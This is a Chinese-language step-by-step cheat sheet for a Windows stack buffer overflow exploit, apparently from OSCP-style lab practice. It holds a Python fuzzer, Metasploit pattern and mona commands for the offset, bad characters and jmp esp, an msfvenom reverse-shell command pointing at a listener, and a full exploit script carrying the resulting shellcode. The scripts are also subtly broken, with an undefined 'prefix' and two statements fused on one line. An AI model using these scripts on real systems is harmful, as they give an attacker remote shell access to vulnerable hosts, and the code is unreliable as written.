# 操作方法

1. 点根烟
2. 模糊测试得到大致溢出点（只修改ip/port）

```bash
#!/usr/bin/python 
import sys,socket 
import time 
address = '<target IP>' 
port = <PORT> 
buffer = ['A'] 
counter = 100 
while len(buffer) < 10: 
 buffer.append('A'*counter) 
 counter=counter+100 
try: 
 for string in buffer: 
  print '[+] Sending %s bytes...' % len(string) 
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  connect=s.connect((address,port)) 
  s.send(string + '\r\n') 
  s.recv(1024) 
  print '[+] Done' 
except: 
  print '[!] Unable to connect to the application. You may have crashed it.' 
  sys.exit(0) 
finally: 
 s.close()
```

1. 得到溢出点

```bash
msf-pattern_create -l 2400（生成多400位的检验字符）（并且放到exp.py）
msf-pattern_offset -l 2400 -q 【eip】(把返回的eip拿来检验)
写到实际攻击payload中去测试
```

```bash
import socket
ip = "192.168.43.57"   //修改
port = 1337   //修改
offset = 1978   //得到的溢出点
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"  //jmp地址倒着写
padding = "\x90" * 16  //默认
payload = ("")
postfix = ""buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(buffer + "\r\n")
  print("Done!")
except:
  print("Could not connect.")

```

1. 找坏字符

```bash
```

```bash
首先生成坏字符
======================================================================
import sys 
for x in range(1,256): 
    sys.stdout.write("\\x" + '{:02x}'.format(x))
======================================================================
倒入mona

!mona bytearray -b "\x00"
就这样每找出来一个坏字符，就重新生成一个不包括他的python对比字典
!mona bytearray -b "\x00\x07"
下面这条命令用来对比（最后面的是esp的值，根据自己的更改）
!mona compare -f C:\mona\oscp\bytearray.bin -a 00DCFA28
```

1. 找jmp

```bash
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
后面的是刚才的坏字符
```

1. 生成payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST= 192.168.247.130 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

```bash
import socket
ip = "192.168.43.57"   //修改
port = 1337   //修改
offset = 1978   //得到的溢出点
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"  //jmp地址倒着写
padding = "\x90" * 16  //默认
payload = ("\xba\xba\x45\x54\xb0\xdb\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\x54\xb9\xb6\x45\x54\xaa\xb5"
"\xa6\xa4\x2b\xda\x2f\x41\x1a\xda\x54\x02\x0d\xea\x1f\x46\xa2"
"\x81\x72\x72\x31\xe7\x5a\x75\xf2\x42\xbd\xb8\x03\xfe\xfd\xdb"
"\x87\xfd\xd1\x3b\xb9\xcd\x27\x3a\xfe\x30\xc5\x6e\x57\x3e\x78"
"\x9e\xdc\x0a\x41\x15\xae\x9b\xc1\xca\x67\x9d\xe0\x5d\xf3\xc4"
"\x22\x5c\xd0\x7c\x6b\x46\x35\xb8\x25\xfd\x8d\x36\xb4\xd7\xdf"
"\xb7\x1b\x16\xd0\x45\x65\x5f\xd7\xb5\x10\xa9\x2b\x4b\x23\x6e"
"\x51\x97\xa6\x74\xf1\x5c\x10\x50\x03\xb0\xc7\x13\x0f\x7d\x83"
"\x7b\x0c\x80\x40\xf0\x28\x09\x67\xd6\xb8\x49\x4c\xf2\xe1\x0a"
"\xed\xa3\x4f\xfc\x12\xb3\x2f\xa1\xb6\xb8\xc2\xb6\xca\xe3\x8a"
"\x7b\xe7\x1b\x4b\x14\x70\x68\x79\xbb\x2a\xe6\x31\x34\xf5\xf1"
"\x36\x6f\x41\x6d\xc9\x90\xb2\xa4\x0e\xc4\xe2\xde\xa7\x65\x69"
"\x1e\x47\xb0\x3e\x4e\xe7\x6b\xff\x3e\x47\xdc\x97\x54\x48\x03"
"\x87\x57\x82\x2c\x22\xa2\x45\x93\x1b\xad\x1b\x7b\x5e\xad\x32"
"\x20\xd7\x4b\x5e\xc8\xb1\xc4\xf7\x71\x98\x9e\x66\x7d\x36\xdb"
"\xa9\xf5\xb5\x1c\x67\xfe\xb0\x0e\x10\x0e\x8f\x6c\xb7\x11\x25"
"\x18\x5b\x83\xa2\xd8\x12\xb8\x7c\x8f\x73\x0e\x75\x45\x6e\x29"
"\x2f\x7b\x73\xaf\x08\x3f\xa8\x0c\x96\xbe\x3d\x28\xbc\xd0\xfb"
"\xb1\xf8\x84\x53\xe4\x56\x72\x12\x5e\x19\x2c\xcc\x0d\xf3\xb8"
"\x89\x7d\xc4\xbe\x95\xab\xb2\x5e\x27\x02\x83\x61\x88\xc2\x03"
"\x1a\xf4\x72\xeb\xf1\xbc\x93\x0e\xd3\xc8\x3b\x97\xb6\x70\x26"
"\x28\x6d\xb6\x5f\xab\x87\x47\xa4\xb3\xe2\x42\xe0\x73\x1f\x3f"
"\x79\x16\x1f\xec\x7a\x33")
postfix = ""buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(buffer + "\r\n")
  print("Done!")
except:
  print("Could not connect.")
```
